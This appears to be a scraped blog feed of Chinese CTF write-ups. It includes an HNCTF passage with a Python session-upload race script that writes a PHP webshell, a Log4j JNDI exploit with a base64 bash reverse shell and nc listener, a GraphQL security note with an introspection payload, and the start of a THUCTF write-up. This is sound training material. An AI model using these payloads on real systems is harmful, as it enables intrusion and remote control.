class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br><br>sessid = <span class="hljs-string">&#x27;HAha&#x27;</span><span class="hljs-comment">#随意</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;echo PD89ZXZhbCgkX1BPU1RbMF0pOw==|base64 -d &gt;/var/www/html/hack.php&#x27;);&quot;</span>&#125;<br>url = <span class="hljs-string">&quot;http://43.143.7.97:28409/&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalStatus</span>:<br>    RESULT = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session,Status</span>):<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><br>        <span class="hljs-keyword">if</span> Status.RESULT:<br>            <span class="hljs-keyword">break</span><br><br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        resp = session.post(url,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&quot;&lt;?php echo &#x27;root&#x27;;eval($_POST[&#x27;cmd&#x27;])?&gt;&quot;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;QAQ.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session,Status</span>):<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        resp = session.post(url+<span class="hljs-string">&#x27;?QAQ=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> Status.RESULT:<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]&quot;</span> + resp.text)<br>            Status.RESULT = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;----------retry--------&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    InitStatus = GlobalStatus()<br><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=write, args=(session,InitStatus)).start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=read, args=(session,InitStatus)).start()<br></code></pre></td></tr></table></figure><p>运行就能成功写入一个shell</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211021215438.png" alt="image-20221102121314161"></p><h2 id="WEEK3-logjjjjlogjjjj"><a href="#WEEK3-logjjjjlogjjjj" class="headerlink" title="[WEEK3]logjjjjlogjjjj"></a>[WEEK3]logjjjjlogjjjj</h2><p>大名鼎鼎的log4j</p><p>一定要注意url编码，一定要注意url编码，一定要注意url编码！</p><p>还有VPS的端口一定要记得开放！</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211021045197.png" alt="image-20221023235416646"></p><p>点开是一个hello页面，url就提供了payload参数，直接在这打</p><p>使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit">工具</a>在vps本地构建一个ldap服务，（这条命令后面的127.0.0.1不需要更改）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar JNDI-Injection-Exploit-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|bash&quot;</span> -A <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>例子为（根据自己的VPS更改）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">6666</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>再起一个终端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p>有给三个payload，一个一个试，最终选择</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Target environment(<span class="hljs-keyword">Build </span>in <span class="hljs-keyword">JDK </span>whose trustURLCodebase is false <span class="hljs-keyword">and </span>have Tomcat <span class="hljs-number">8</span>+ <span class="hljs-keyword">or </span>SpringBoot <span class="hljs-number">1</span>.<span class="hljs-number">2</span>.x+ in classpath):<br></code></pre></td></tr></table></figure><p>传参</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211021045666.png" alt="image-20221023235723911"></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211021045780.png" alt="image-20221023235200747"></p><p>反弹shell也成功</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211021045517.png" alt="image-20221023235232099"></p><p>得到flag</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211021045660.png" alt="image-20221023235248505"></p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>第四周就没写了，转场isctf了，这段时间打新生赛很多收获，基础巩固了不少</p><p>感谢NSS平台，感谢各个赛事主办方</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>2022</tag>
      
      <tag>HNCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GraphQL浅记</title>
    <link href="/2022/10/04/GraphQL/"/>
    <url>/2022/10/04/GraphQL/</url>
    
    <content type="html"><![CDATA[<p>在2022New Star碰到GraphQL相关题目（ezAPI），记录一下GraphQL的学习。</p><h2 id="GraphQL简介"><a href="#GraphQL简介" class="headerlink" title="GraphQL简介"></a>GraphQL简介</h2><p>GraphQL是由Facebook开发并于2015年公开发布的<strong>数据查询语言</strong>。是REST API的替代品。作为一种 API 查询语言，GraphQL 不要求实现它的应用服务器使用特定的编程语言或存储系统，且它与底层数据库无关，可以与MySQL数据库一起使用，也可以与Nosql数据库搭配。</p><p>与其类似的还有RESTful API，区别在于，RESTful API需要多个API实现不同的功能，而GraphQL获取多个资源，只用一个请求。但是也不是所有需求都适用GraphQL，简单的需求还是使用RESTful API，GraphQL查询的数据是图状数据结构，一些没有图的概念的数据使用GraphQL并没有显著的效果。</p><p>SQL是结构化查询语言，GraphQL是图表化查询语言。</p><h2 id="GraphQL查询响应格式"><a href="#GraphQL查询响应格式" class="headerlink" title="GraphQL查询响应格式"></a>GraphQL查询响应格式</h2><p>基本的GraphQL查询</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-keyword">query</span>&#123;<br>  <span class="hljs-keyword">user</span>&#123;<br>​    <span class="hljs-built_in">id</span><br>​    email<br>​    firstName<br>​    lastName<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>基本的GraphQL响应</p><p>响应结果则是json类型：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;user&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;666&quot;</span>,<br>            <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;xxx@qq.com&quot;</span>,<br>            <span class="hljs-string">&quot;firstName&quot;</span>: <span class="hljs-string">&quot;xx&quot;</span>,<br>            <span class="hljs-string">&quot;lastName&quot;</span>: <span class="hljs-string">&quot;xx&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>官方文档：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">查询和其结果拥有几乎一样的结构。这是 GraphQL 最重要的特性，<br>因为这样一来，你就总是能得到你想要的数据，而服务器也准确地知道客户端请求的字段。<br></code></pre></td></tr></table></figure><p> 例如这样的</p><p><img src="/Users/yinbing\AppData\Roaming\Typora\typora-user-images\image-20221004200939127.png" alt="image-20221004200939127"></p><p>类似于json，但是有很多换行符。</p><h2 id="GraphQL主要操作"><a href="#GraphQL主要操作" class="headerlink" title="GraphQL主要操作"></a>GraphQL主要操作</h2><h3 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h3><p>GraphQL 关于请求对象上的特定字段，即要操作（查询更改…）的对象。</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>GraphQL 对象类型上的每一个字段都可能有零个或者多个参数。</p><p><strong>GraphQL基本参数类型</strong></p><ul><li>String, Int, Float, <a href="https://so.csdn.net/so/search?q=Boolean&spm=1001.2101.3001.7020">Boolean</a>和ID。在schema声明时直接使用。 （ID不能重复使用）</li><li>!（叹号）代表参数不能为空。</li></ul><h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><p>类似于SQL的增删改查，GraphQL主要有三种操作query、mutation 和 subscription，分别对应查询、变更和订阅。</p><p>官方文档：</p><figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs graphql">操作类型可以是 <span class="hljs-keyword">query</span>、<span class="hljs-keyword">mutation</span> 或 <span class="hljs-keyword">subscription</span>，<br>描述你打算做什么类型的操作。操作类型是必需的，<br>除非你使用查询简写语法，在这种情况下，你无法为操作提供名称或变量定义。<br></code></pre></td></tr></table></figure><h3 id="内省查询"><a href="#内省查询" class="headerlink" title="内省查询"></a>内省查询</h3><p>GraphQL内置了内省系统，通过它给出的内省方法，我们可以获得对象名称、类型、参数等多种信息。</p><p>官方文档：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sqf">我们也可以通过查询 <span class="hljs-variable">__schema</span> 字段来向 GraphQL 询问哪些类型是可用的。<br>一个查询的根类型总是有 <span class="hljs-variable">__schema</span> 这个字段。<br><br>有好多类型！它们都是什么？我们来总结一下：<br>    Query, Character, Human, Episode, Droid <br>    - 这些是我们在类型系统中定义的类型。<br>    String, Boolean <br>    - 这些是内建的标量，由类型系统提供。<br>    <span class="hljs-variable">__Schema</span>, <span class="hljs-variable">__Type</span>, <span class="hljs-variable">__TypeKind</span>, <span class="hljs-variable">__Field</span>, <span class="hljs-variable">__InputValue</span>, <span class="hljs-variable">__EnumValue</span>, <span class="hljs-variable">__Directive</span> <br>    - 这些有着两个下划线的类型是内省系统的一部分。<br></code></pre></td></tr></table></figure><p>我的理解：information_schema（像不像 (*^▽^*)</p><h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><p> 上述查询是<strong>可交互的</strong>。也就是你可以按你喜欢来改变查询，然后看看新的结果。(也就是可以更改查询语句得到想要的结果)</p><p>GraphQL 对象类型上的每一个字段都可能有零个或者多个参数。（参数个数不同可能得不到我们想要的内容，比如flag）</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">data</span><span class="hljs-operator">=</span>&#123;<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;query&#123;<span class="hljs-char escape_">\n</span>users_user_by_pk(id:1)&#123;<span class="hljs-char escape_">\n</span>name<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&quot;</span>,<span class="hljs-string">&quot;variables&quot;</span>:<span class="hljs-literal">null</span>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<span class="hljs-string">&quot;query&quot;</span>:<br><span class="hljs-string">&quot;query&#123;</span><br>users_user_by_pk(id:<span class="hljs-number">1</span>)<br>&#123;<br>name<br>&#125;<br>&#125;<br><span class="hljs-string">&quot;,&quot;</span>variables<span class="hljs-string">&quot;:null&#125;</span><br></code></pre></td></tr></table></figure><p>从users_user_by_pk这个接口查询id&#x3D;1的字段的name属性。</p><h2 id="GraphQL-端点"><a href="#GraphQL-端点" class="headerlink" title="GraphQL 端点"></a>GraphQL 端点</h2><p>常见的GraphQL端点：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/graphql/</span><br><span class="hljs-regexp">/graphql/</span>console/<br>/graphql.php<br><span class="hljs-regexp">/graphiql/</span><br>/graphiql.php<br>[...]<br></code></pre></td></tr></table></figure><p>可以通过向端点发送一个无效查询，是否报错判断端点。</p><p>在测试应用程序时，验证是否可以在没有一般授权令牌标头的情况下发出请求，因为GraphQL本身没有提供任何数据保护手段，只能通过其他方法进行访问控制，不让端点被恶意利用。</p><h2 id="GraphQL可能存在的隐患"><a href="#GraphQL可能存在的隐患" class="headerlink" title="GraphQL可能存在的隐患"></a>GraphQL可能存在的隐患</h2><h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><p>开发者在使用时经常会忽略接口的鉴权问题。导致访问控制容易被破坏，不安全的对象直接引用甚至SQL或NoSQL进行注入。有时候客户端调用查询接口，直接传入了id等信息并未做好权限校验，就有可能存在水平越权。</p><h3 id="GraphQL内省查询"><a href="#GraphQL内省查询" class="headerlink" title="GraphQL内省查询"></a>GraphQL内省查询</h3><p>最常见的问题，内省查询本来应该是仅允许内部访问，但<strong>配置错误</strong>导致任何攻击者可以利用内省查询。</p><p>payload：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;&quot;query&quot;:&quot;&#123;__schema&#123;queryType&#123;name&#125;</span><span class="language-xml">,mutationType</span><span class="hljs-template-variable">&#123;name&#125;</span><span class="language-xml">,subscriptionType</span><span class="hljs-template-variable">&#123;name&#125;</span><span class="language-xml">,types</span><span class="hljs-template-variable">&#123;...FullType&#125;</span><span class="language-xml">,directives</span><span class="hljs-template-variable">&#123;name,description,locations,args&#123;...InputValue&#125;</span><span class="language-xml">&#125;&#125;&#125;,fragment FullType on __Type</span><span class="hljs-template-variable">&#123;kind,name,description,fields(includeDeprecated:true)&#123;name,description,args&#123;...InputValue&#125;</span><span class="language-xml">,type</span><span class="hljs-template-variable">&#123;...TypeRef&#125;</span><span class="language-xml">,isDeprecated,deprecationReason&#125;,inputFields</span><span class="hljs-template-variable">&#123;...InputValue&#125;</span><span class="language-xml">,interfaces</span><span class="hljs-template-variable">&#123;...TypeRef&#125;</span><span class="language-xml">,enumValues(includeDeprecated:true)</span><span class="hljs-template-variable">&#123;name,description,isDeprecated,deprecationReason&#125;</span><span class="language-xml">,possibleTypes</span><span class="hljs-template-variable">&#123;...TypeRef&#125;</span><span class="language-xml">&#125;,fragment InputValue on __InputValue</span><span class="hljs-template-variable">&#123;name,description,type&#123;...TypeRef&#125;</span><span class="language-xml">,defaultValue&#125;,fragment TypeRef on __Type</span><span class="hljs-template-variable">&#123;kind,name,ofType&#123;kind,name,ofType&#123;kind,name,ofType&#123;kind,name,ofType&#123;kind,name,ofType&#123;kind,name,ofType&#123;kind,name,ofType&#123;kind,name&#125;</span><span class="language-xml">&#125;&#125;&#125;&#125;&#125;&#125;&#125;&quot;,&quot;variables&quot;:</span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">&#125;</span><br></code></pre></td></tr></table></figure><p>返回包返回的就是该API端点的所有信息。</p><p>通过内省查询得到很多接口信息，造成信息泄露。</p><h3 id="嵌套查询DoS"><a href="#嵌套查询DoS" class="headerlink" title="嵌套查询DoS"></a>嵌套查询DoS</h3><p>当业务的变量互相关联，如以下graphql定义为这样时，就可能无限展开，造成拒绝服务。</p><p>它们可以允许恶意客户端通过<strong>过度复杂的查询</strong>来执行DoS（拒绝服务）攻击，占用服务器的资源。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span> <span class="hljs-type">Thread</span> &#123;<br>  messages(first: <span class="hljs-type">Int</span>, after: <span class="hljs-type">String</span>): [<span class="hljs-type">Message</span>]<br>&#125;<br><span class="hljs-keyword">type</span> <span class="hljs-type">Message</span> &#123;<br>  thread: <span class="hljs-type">Thread</span><br>&#125;<br><span class="hljs-keyword">type</span> <span class="hljs-type">Query</span> &#123;<br>  thread(id: <span class="hljs-type">ID</span>!): <span class="hljs-type">Thread</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210042341981.png" alt="image-20221004232945314"></p><p>针对DoS的简单修复方式可以是设置超时，最大深度或查询复杂度阈值。</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p> graphql的sql注入与一般的sql注入类似，都是可以通过构造恶意语句达到注入获取数据或改变查询逻辑的目的。p神在先知大会上讲过该类问题，借用p神的2张PPT。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210042342282.png" alt="image-20221004233248293"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>参考2022NewStarCTF ezAPI。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.doyensec.com/2018/05/17/graphql-security-overview.html">https://blog.doyensec.com/2018/05/17/graphql-security-overview.html</a></p><p><a href="https://www.anquanke.com/post/id/147455#h2-9">https://www.anquanke.com/post/id/147455#h2-9</a></p><p><a href="https://www.secpulse.com/archives/148242.html">https://www.secpulse.com/archives/148242.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/124019191#">https://zhuanlan.zhihu.com/p/124019191#</a></p><p><a href="https://www.zhihu.com/question/264629587">https://www.zhihu.com/question/264629587</a></p><p><a href="https://zhuanlan.zhihu.com/p/506391425">https://zhuanlan.zhihu.com/p/506391425</a></p><p><a href="https://blog.csdn.net/A_bad_horse/article/details/105377150">https://blog.csdn.net/A_bad_horse/article/details/105377150</a></p><p>官方文档：</p><p><a href="https://graphql.bootcss.com/">https://graphql.bootcss.com/</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>sql</tag>
      
      <tag>GraphQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022THU CTF</title>
    <link href="/2022/10/04/2022THUCTF/"/>
    <url>/2022/10/04/2022THUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="THUCTF-2022"><a href="#THUCTF-2022" class="headerlink" title="THUCTF 2022"></a>THUCTF 2022</h1><p>部分wp，又被大佬们吊打了捏-。-</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="What-is-flag1"><a href="#What-is-flag1" class="headerlink" title="What is $? - flag1"></a>What is $? - flag1</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>PHP<br></code></pre></td></tr></table></figure><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// error_reporting(1);</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">autoload</span>(<span class="hljs-params"><span class="hljs-variable">$class</span></span>) </span>&#123;<br>    @<span class="hljs-keyword">include_once</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$class</span>)).<span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">spl_autoload_register</span>(<span class="hljs-string">&#x27;autoload&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) || (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;login&#x27;</span> &amp;&amp; (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_user&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_pass&#x27;</span>]))))<br>    <span class="hljs-keyword">die</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;login&#x27;</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_user&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;access denied&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">require_admin</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) || !<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;access denied&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;login&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_user&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/a/si&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_pass&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_pass&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_salt&#x27;</span>].<span class="hljs-string">&#x27;a&#x27;</span>)) &#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">die</span>(lib<span class="hljs-title class_">\Flag</span>::<span class="hljs-variable constant_">FLAG1</span>);<br>        &#125; <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;try harder&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;save_item&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">require_admin</span>();<br><br>        <span class="hljs-variable">$item_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;item&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$item_uuid</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;item&#x27;</span>][<span class="hljs-string">&#x27;uuid&#x27;</span>];<br>        <span class="hljs-variable">$item_content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;item&#x27;</span>][<span class="hljs-string">&#x27;content&#x27;</span>];<br>        <span class="hljs-variable">$item_filename</span> = <span class="hljs-string">&#x27;up/&#x27;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$item_name</span>),<span class="hljs-number">0</span>,<span class="hljs-number">4</span>).<span class="hljs-string">&#x27;.php&#x27;</span>;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-zA-Z0-9]*$/&#x27;</span>, <span class="hljs-variable">$item_name</span>) || !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\S&#123;8&#125;-\S&#123;27&#125;$/&#x27;</span>, <span class="hljs-variable">$item_uuid</span>))<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;blanket and special characters is not allowed in item name or uuid is invalid&#x27;</span>);<br><br>        <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> lib\<span class="hljs-title function_ invoke__">DB</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;INSERT 